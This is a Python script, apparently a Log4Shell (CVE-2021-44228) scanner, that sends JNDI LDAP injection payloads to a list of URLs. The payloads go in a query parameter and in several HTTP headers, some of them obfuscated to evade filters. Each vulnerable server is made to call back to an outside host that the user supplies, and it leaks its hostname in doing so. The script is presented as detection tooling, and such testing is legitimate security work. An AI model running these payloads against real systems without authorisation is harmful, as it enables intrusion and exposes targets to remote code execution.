from sys import argv
from requests import get
from urllib3 import disable_warnings
from concurrent.futures import ThreadPoolExecutor

def sendDetectionRequest(url, urlId):
    try:
        payload1 = '${jndi:ldap://' + str(urlId) + '.${hostName}.' + argv[2] + '/a}'
        payload2 = '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://' + str(urlId) + '.${hostName}.' + argv[2] + '}'
        payload3 = '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://' + str(urlId) + '.${hostName}.' + argv[2] + '}'
        params = {'x':payload1}
        headers = {'User-Agent':payload2, 'Referer':payload3, 'X-Forwarded-For':payload3, 'Authentication':payload3}
        url = url.strip()
        print('[{}] Testing {}'.format(urlId, url))
        get(url, headers=headers, params=params, verify=False, proxies=proxies, timeout=10)
    except Exception as e:
        print(e)
        pass

if len(argv) > 1:
    disable_warnings()
    proxies = {}
    # proxies = {"http":"http://127.0.0.1:8080", "https":"http://127.0.0.1:8080"}
    threads = []
    urlId = 0
    try:
        urlFile = open(argv[1], 'r')
        urlList = urlFile.readlines()
    except:
        urlList = [argv[1]]
    with ThreadPoolExecutor(max_workers=15) as executor:
        for url in urlList:
            urlId += 1
            threads.append(executor.submit(sendDetectionRequest, url, urlId))
else:
    print('[!] Syntax: python3 {} <url/urlFile> <collaboratorPayload>'.format(argv[0]))
